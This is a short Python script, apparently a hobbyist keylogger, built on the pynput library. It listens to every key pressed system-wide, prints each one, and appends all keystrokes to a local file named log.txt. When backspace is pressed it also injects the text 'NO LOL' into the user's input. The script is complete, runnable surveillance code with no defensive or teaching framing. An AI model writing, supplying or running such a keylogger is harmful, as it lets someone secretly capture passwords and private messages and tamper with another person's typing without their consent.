from pynput import keyboard
from pynput.keyboard import Controller

controller = Controller()
def on_key(key):
    try:
        print(key.char)
    except AttributeError:
        print(key)

    file = open('log.txt', 'a+')
    if key == keyboard.Key.enter:
        file.write('\n')
    else:
        file.write(key.__str__().replace("'", ''))

    if key == keyboard.Key.backspace:
        print("it's a backspace")
        controller.type('NO LOL')


with keyboard.Listener(on_press=on_key) as listener:
    listener.join()